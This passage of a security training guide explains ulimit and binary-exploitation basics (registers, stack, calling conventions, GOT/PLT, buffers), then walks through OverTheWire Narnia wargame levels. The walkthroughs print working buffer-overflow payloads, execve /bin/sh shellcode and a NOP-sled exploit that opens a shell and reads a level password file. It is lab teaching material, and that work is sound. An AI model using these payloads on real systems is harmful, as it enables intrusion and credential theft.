     <span class="n">ulimit</span> <span class="p">[</span><span class="o">-</span><span class="n">acdfHlmnpsStuv</span><span class="p">]</span> <span class="p">[</span><span class="n">limit</span><span class="p">]</span>

<span class="n">Options</span>

  <span class="o">-</span><span class="n">S</span>   <span class="n">Change</span> <span class="ow">and</span> <span class="n">report</span> <span class="n">the</span> <span class="n">soft</span> <span class="n">limit</span> <span class="n">associated</span> <span class="k">with</span> <span class="n">a</span> <span class="n">resource</span><span class="o">.</span>
  <span class="o">-</span><span class="n">H</span>   <span class="n">Change</span> <span class="ow">and</span> <span class="n">report</span> <span class="n">the</span> <span class="n">hard</span> <span class="n">limit</span> <span class="n">associated</span> <span class="k">with</span> <span class="n">a</span> <span class="n">resource</span><span class="o">.</span>

  <span class="o">-</span><span class="n">a</span>   <span class="n">All</span> <span class="n">current</span> <span class="n">limits</span> <span class="n">are</span> <span class="n">reported</span><span class="o">.</span>
  <span class="o">-</span><span class="n">c</span>   <span class="n">The</span> <span class="n">maximum</span> <span class="n">size</span> <span class="n">of</span> <span class="n">core</span> <span class="n">files</span> <span class="n">created</span><span class="o">.</span>
  <span class="o">-</span><span class="n">d</span>   <span class="n">The</span> <span class="n">maximum</span> <span class="n">size</span> <span class="n">of</span> <span class="n">a</span> <span class="n">process</span><span class="s1">&#39;s data segment.</span>
  <span class="o">-</span><span class="n">f</span>   <span class="n">The</span> <span class="n">maximum</span> <span class="n">size</span> <span class="n">of</span> <span class="n">files</span> <span class="n">created</span> <span class="n">by</span> <span class="n">the</span> <span class="n">shell</span><span class="p">(</span><span class="n">default</span> <span class="n">option</span><span class="p">)</span>
  <span class="o">-</span><span class="n">l</span>   <span class="n">The</span> <span class="n">maximum</span> <span class="n">size</span> <span class="n">that</span> <span class="n">can</span> <span class="n">be</span> <span class="n">locked</span> <span class="n">into</span> <span class="n">memory</span><span class="o">.</span>
  <span class="o">-</span><span class="n">m</span>   <span class="n">The</span> <span class="n">maximum</span> <span class="n">resident</span> <span class="nb">set</span> <span class="n">size</span><span class="o">.</span>
  <span class="o">-</span><span class="n">n</span>   <span class="n">The</span> <span class="n">maximum</span> <span class="n">number</span> <span class="n">of</span> <span class="nb">open</span> <span class="n">file</span> <span class="n">descriptors</span><span class="o">.</span>
  <span class="o">-</span><span class="n">p</span>   <span class="n">The</span> <span class="n">pipe</span> <span class="n">buffer</span> <span class="n">size</span><span class="o">.</span>
  <span class="o">-</span><span class="n">s</span>   <span class="n">The</span> <span class="n">maximum</span> <span class="n">stack</span> <span class="n">size</span><span class="o">.</span>
  <span class="o">-</span><span class="n">t</span>   <span class="n">The</span> <span class="n">maximum</span> <span class="n">amount</span> <span class="n">of</span> <span class="n">cpu</span> <span class="n">time</span> <span class="ow">in</span> <span class="n">seconds</span><span class="o">.</span>
  <span class="o">-</span><span class="n">u</span>   <span class="n">The</span> <span class="n">maximum</span> <span class="n">number</span> <span class="n">of</span> <span class="n">processes</span> <span class="n">available</span> <span class="n">to</span> <span class="n">a</span> <span class="n">single</span> <span class="n">user</span><span class="o">.</span>
  <span class="o">-</span><span class="n">v</span>   <span class="n">The</span> <span class="n">maximum</span> <span class="n">amount</span> <span class="n">of</span> <span class="n">virtual</span> <span class="n">memory</span> <span class="n">available</span> <span class="n">to</span> <span class="n">the</span> <span class="n">process</span><span class="o">.</span>
</pre></div>
</div>
<p>ulimit provides control over the resources available to the shell and to processes started by it, on systems that allow such control.</p>
<p>The soft limit is the value that the kernel enforces for the corresponding resource. The hard limit acts as a ceiling for the soft limit.</p>
</section>
</section>
<section id="appendix-iii-basic-concepts">
<h3>Appendix-III Basic Concepts<a class="headerlink" href="#appendix-iii-basic-concepts" title="Link to this heading"></a></h3>
<p>The below has been completely taken from <a class="reference external" href="https://ctf101.org/binary-exploitation/overview/">Binary Exploitation CTF101</a></p>
<p>Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable.
Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program’s functions.</p>
<section id="registers">
<h4>Registers<a class="headerlink" href="#registers" title="Link to this heading"></a></h4>
<p>A register is a location within the processor that is able to store data, much like RAM.</p>
<p>Registers can hold any value: addresses (pointers), results from mathematical operations, characters, etc. Some registers are reserved however, meaning they have a special purpose and are not “general purpose registers” (GPRs).</p>
<p>On x86, the only 2 reserved registers are</p>
<ul class="simple">
<li><p>rip which hold the address of the next instruction to execute and</p></li>
<li><p>rsp which hold the address of the stack respectively.</p></li>
</ul>
<p>On x86, the same register can have different sized accesses for backwards compatability. For example,</p>
<ul class="simple">
<li><p>the rax register is the full 64-bit register,</p></li>
<li><p>eax is the low 32 bits of rax,</p></li>
<li><p>ax is the low 16 bits,</p></li>
<li><p>al is the low 8 bits, and ah is the high 8 bits of ax (bits 8-16 of rax).</p></li>
</ul>
</section>
<section id="stack">
<h4>Stack<a class="headerlink" href="#stack" title="Link to this heading"></a></h4>
<p>In computer architecture, the stack is a hardware manifestation of the stack data structure (a Last In, First Out queue).</p>
<ul class="simple">
<li><p>The esp/rsp register holds the address in memory where the bottom of the stack resides.</p></li>
<li><p>When something is pushed to the stack, esp decrements by 4 (or 8 on 64-bit x86), and the value that was pushed is stored at that location in memory.</p></li>
<li><p>Likewise, when a pop instruction is executed, the value at esp is retrieved (i.e. esp is dereferenced), and esp is then incremented by 4 (or 8).</p></li>
</ul>
<p>..Note :: The stack “grows” down to lower memory addresses!</p>
<ul class="simple">
<li><p>Conventionally, ebp/rbp contains the address of the top of the current stack frame, and so sometimes local variables are referenced as an offset relative to ebp rather than an offset to esp.</p></li>
<li><p>A stack frame is essentially just the space used on the stack by a given function.</p></li>
</ul>
<section id="uses">
<h5>Uses<a class="headerlink" href="#uses" title="Link to this heading"></a></h5>
<p>The stack is primarily used for a few things:</p>
<ul class="simple">
<li><p>Storing function arguments</p></li>
<li><p>Storing local variables</p></li>
<li><p>Storing processor state between function calls</p></li>
</ul>
</section>
<section id="example">
<h5>Example<a class="headerlink" href="#example" title="Link to this heading"></a></h5>
<p>Let’s compile a simple program and check for stack</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#include &lt;stdio.h&gt;</span>
<span class="n">void</span> <span class="n">say_hi</span><span class="p">(</span><span class="n">const</span> <span class="n">char</span> <span class="o">*</span> <span class="n">name</span><span class="p">)</span> <span class="p">{</span>
   <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Hello </span><span class="si">%s</span><span class="s2">!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
<span class="p">}</span>

<span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
   <span class="n">char</span> <span class="o">*</span> <span class="n">name</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
       <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
   <span class="p">}</span>
   <span class="n">name</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
   <span class="n">say_hi</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">gcc</span> <span class="o">-</span><span class="n">g</span> <span class="n">hello</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">hello</span>
</pre></div>
</div>
<p>Put breakpoints at the call of say_hi function</p>
<ul class="simple">
<li><p>Check whats the esp and ebp value.</p></li>
<li><p>When a call instruction is executed; call instructions first push the current instruction pointer to the stack, then jump to their destination.</p></li>
<li><p>The first thing say_hi does is save the current ebp so that when it returns, ebp is back where main expects it to be.</p></li>
</ul>
</section>
</section>
<section id="calling-conventions">
<h4>Calling Conventions<a class="headerlink" href="#calling-conventions" title="Link to this heading"></a></h4>
<p>To be able to call functions, there needs to be an agreed-upon way to pass arguments.</p>
<p>In Linux binaries, there are really only two commonly used calling conventions: cdecl for 32-bit binaries, and SysV for 64-bit</p>
<section id="cdecl">
<h5>cdecl<a class="headerlink" href="#cdecl" title="Link to this heading"></a></h5>
<p>In 32-bit binaries on Linux, function arguments are passed in on the stack in reverse order. A function like this:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">add</span><span class="p">(</span><span class="nb">int</span> <span class="n">a</span><span class="p">,</span> <span class="nb">int</span> <span class="n">b</span><span class="p">,</span> <span class="nb">int</span> <span class="n">c</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span> <span class="o">+</span> <span class="n">c</span><span class="p">;</span>
   <span class="p">}</span>
</pre></div>
</div>
<p>would be invoked by pushing c, then b, then a.</p>
</section>
<section id="sysv">
<h5>SysV<a class="headerlink" href="#sysv" title="Link to this heading"></a></h5>
<p>For 64-bit binaries, function arguments are first passed in certain registers:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">RDI</span>
<span class="n">RSI</span>
<span class="n">RDX</span>
<span class="n">RCX</span>
<span class="n">R8</span>
<span class="n">R9</span>
</pre></div>
</div>
<p>then any leftover arguments are pushed onto the stack in reverse order, as in cdecl.</p>
</section>
</section>
<section id="global-offset-table">
<h4>Global Offset Table<a class="headerlink" href="#global-offset-table" title="Link to this heading"></a></h4>
<p>The Global Offset Table (or GOT) is a section inside of programs that holds addresses of functions that are dynamically linked. common functions (like those in libc) are “linked”
into the program so they can be saved once on disk and reused by every program.</p>
<p>Unless a program is marked full RELRO, the resolution of function to address in dynamic library is done lazily. All dynamic libraries are loaded into memory along with the main program at launch, however functions are not mapped to their actual code until they’re first called. For example, in the following C snippet puts won’t be resolved to an address in libc until after it has been called once:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Hi there!&quot;</span><span class="p">);</span>
   <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Ok bye now.&quot;</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>To avoid searching through shared libraries each time a function is called, the result of the lookup is saved into the GOT so future function calls “short circuit” straight to their implementation bypassing the dynamic resolver.</p>
<p>This has two important implications:</p>
<ul class="simple">
<li><p>The GOT contains pointers to libraries which move around due to ASLR</p></li>
<li><p>The GOT is writable</p></li>
</ul>
<section id="plt">
<h5>PLT<a class="headerlink" href="#plt" title="Link to this heading"></a></h5>
<p>Before a functions address has been resolved, the GOT points to an entry in the Procedure Linkage Table (PLT). This is a small “stub” function which is responsible for calling the dynamic linker with (effectively) the name of
the function that should be resolved.</p>
</section>
</section>
<section id="buffer">
<h4>Buffer<a class="headerlink" href="#buffer" title="Link to this heading"></a></h4>
<p>A buffer is any allocated space in memory where data (often user input) can be stored.</p>
<p>In the following C program name would be considered a stack buffer:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#include &lt;stdio.h&gt;</span>

<span class="nb">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
<span class="n">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="mi">63</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Hello </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>Buffers could also be global variables:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#include &lt;stdio.h&gt;</span>
<span class="n">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="nb">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span> <span class="n">code_snippet</span> <span class="p">}</span>
</pre></div>
</div>
<p>Or dynamically allocated on the heap like</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">char</span> <span class="o">*</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
<span class="n">memset</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
</pre></div>
</div>
</section>
</section>
<section id="buffer-overflow-examples">
<h3>Buffer Overflow Examples<a class="headerlink" href="#buffer-overflow-examples" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p>Let’s see a simple example of binary exploitation Narnia0 where we have to write a written value.</p></li>
</ul>
<blockquote>
<div><div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span>
<span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Here is your chance: &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%24s&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;val: 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;WAY OFF!!!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>In this example, value of variable val can be overwritten by overflowing buf. Another small observation is scanf function scans 24 characters. If you directly write 20 “A” and the address it won’t work as the val doesn’t matches. So, we have to use python print command. If we use</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;print &quot;A&quot;*20 + &quot;</span><span class="se">\xef\xbe\xad\xde</span><span class="s1">&quot;&#39;</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
</pre></div>
</div>
<p>you will see that the value would match but the shell is exited. To keep the shell active, we need to use cat as shown below:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;print &quot;A&quot;*20 + &quot;</span><span class="se">\xef\xbe\xad\xde</span><span class="s1">&quot;&#39;</span><span class="p">;</span><span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>In another example below Narnia1</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#include &lt;stdio.h&gt;</span>

<span class="nb">int</span> <span class="n">main</span><span class="p">(){</span>
    <span class="nb">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)();</span>

    <span class="k">if</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;EGG&quot;</span><span class="p">)</span><span class="o">==</span><span class="n">NULL</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Give me something to execute at the env-variable EGG</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Trying to execute EGG!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;EGG&quot;</span><span class="p">);</span>
    <span class="n">ret</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>We need to set a environment variable EGG with an shellcode. Previously, I tried with</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="s2">&quot;</span><span class="se">\b</span><span class="s2">in\sh&quot;</span>
<span class="ow">and</span>
<span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="s2">&quot;</span><span class="se">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><span class="s2">&quot;</span>
</pre></div>
</div>
<p>Shellcode were taken from the Shellstorm website. However, both failed with Segmentation fault. superkojiman, barrebas helped me with and told that if I write</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>export EGG=`python -c &#39;print &quot;\xCC&quot;&#39;`
</pre></div>
</div>
<p>It should sigtrap. “xCC” acts as a software breakpoint, basically an INT3, It tells you whether your shellcode is stored properly &amp; executed, if the program receives SIGTRAP, you know you’re good to go, and it’s a good way to make sure you’ve properly redirected execution to your shellcode. You can further put “xCC” anywhere in the shellcode, if it crashes before “xCC”, you know for sure that your shellcode has bad characters. They suggested to export the EGG variable as</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>export EGG=`python -c &#39;print &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;&#39;`
</pre></div>
</div>
<p>and it worked like a charm.</p>
</div></blockquote>
<ul class="simple">
<li><p>In another example Narnia2</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#include &lt;stdio.h&gt;</span>
<span class="c1">#include &lt;string.h&gt;</span>
<span class="c1">#include &lt;stdlib.h&gt;</span>

<span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
    <span class="n">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Usage: </span><span class="si">%s</span><span class="s2"> argument</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>It’s to easy that buffer overflow vulnerability exists because of strcpy. Let’s see what is the offset for this.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ulimit -c unlimited
./narnia2 `/usr/share/metasploit-framework/tools/pattern_create.rb 200`
Segmentation fault (core dumped)

gdb -q -c core ./narnia2
#0  0x37654136 in ?? ()

/usr/share/metasploit-framework/tools/pattern_offset.rb 0x37654136
[*] Exact match at offset 140
narnia2@melinda:~$ gdb -q /narnia/narnia2
(gdb) disassemble main
Dump of assembler code for function main:
**Snip**
   0x080484a0 &lt;+67&gt;:    mov    %eax,(%esp)
   0x080484a3 &lt;+70&gt;:    call   0x8048320 &lt;strcpy@plt&gt;
**Snip**
End of assembler dump.
(gdb) br *main+70
Breakpoint 1 at 0x80484a3
(gdb) run `python -c &#39;print &quot;A&quot;*140 + &quot;BBBB&quot;&#39;`
Starting program: /games/narnia/narnia2 `python -c &#39;print &quot;A&quot;*140 + &quot;BBBB&quot;&#39;`

Breakpoint 1, 0x080484a3 in main ()
(gdb) n
0x42424242 in ?? ()
</pre></div>
</div>
<p>Let’s see the stack after the strcpy, which would tell us the probable address we want to redirect execution.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) x/80xw $esp+400
0xffffd7e0: 0x0000000f  0xffffd80b  0x00000000  0x00000000
0xffffd7f0: 0x00000000  0x00000000  0x1d000000  0xa9c79d1b
0xffffd800: 0xe1a67367  0xc19fc850  0x6996cde4  0x00363836
0xffffd810: 0x2f000000  0x656d6167  0x616e2f73  0x61696e72
0xffffd820: 0x72616e2f  0x3261696e  0x41414100  0x41414141
0xffffd830: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd840: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd850: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd860: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd870: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd880: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd890: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8a0: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd8b0: 0x41414141  0x42424241  0x44580042  0x45535f47
0xffffd8c0: 0x4f495353  0x44495f4e  0x3939383d  0x53003733
</pre></div>
</div>
<p>Let pick a shellcode from shellstorm for a Linux x86 execuve /bin/sh and calculate the number of NOPs</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia2@melinda:~$ python -c &#39;print len(&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;)&#39;
23
narnia2@melinda:~$ bc
140-23
117
narnia2@melinda:~$ /narnia/narnia2 `python -c &#39;print &quot;\x90&quot;*117 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;\x50\xd8\xff\xff&quot;&#39;`
$ cat /etc/narnia_pass/narnia3
**********
$
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>In another example Narnia3</p></li>
</ul>
<blockquote>
<div><div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/stat.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;fcntl.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">){</span>

<span class="w">        </span><span class="kt">int</span><span class="w">  </span><span class="n">ifd</span><span class="p">,</span><span class="w">  </span><span class="n">ofd</span><span class="p">;</span>
<span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="n">ofile</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/dev/null&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="n">ifile</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
<span class="w">        </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>

<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">2</span><span class="p">){</span>
<span class="w">                </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;usage, %s file, will send contents of file 2 /dev/null</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="w">                </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="cm">/* open files */</span>
<span class="w">        </span><span class="n">strcpy</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="w">        </span><span class="k">if</span><span class="p">((</span><span class="n">ofd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="n">ofile</span><span class="p">,</span><span class="n">O_RDWR</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">){</span>
<span class="w">                </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ofile</span><span class="p">);</span>
<span class="w">                </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">if</span><span class="p">((</span><span class="n">ifd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">){</span>
<span class="w">                </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ifile</span><span class="p">);</span>
<span class="w">                </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="cm">/* copy from file1 to file2 */</span>
<span class="w">        </span><span class="n">read</span><span class="p">(</span><span class="n">ifd</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="mi">-1</span><span class="p">);</span>
<span class="w">        </span><span class="n">write</span><span class="p">(</span><span class="n">ofd</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="mi">-1</span><span class="p">);</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;copied contents of %s to a safer place... (%s)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">ifile</span><span class="p">,</span><span class="n">ofile</span><span class="p">);</span>

<span class="w">        </span><span class="cm">/* close &#39;em */</span>
<span class="w">        </span><span class="n">close</span><span class="p">(</span><span class="n">ifd</span><span class="p">);</span>
<span class="w">        </span><span class="n">close</span><span class="p">(</span><span class="n">ofd</span><span class="p">);</span>

<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
<p>Superkojiman notes explain this best, copied here with permission, thanks superkojiman :)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>narnia3@melissa:/narnia$ ./narnia3 /etc/motd
copied contents of /etc/motd to a safer place... (/dev/null)
</pre></div>
</div>
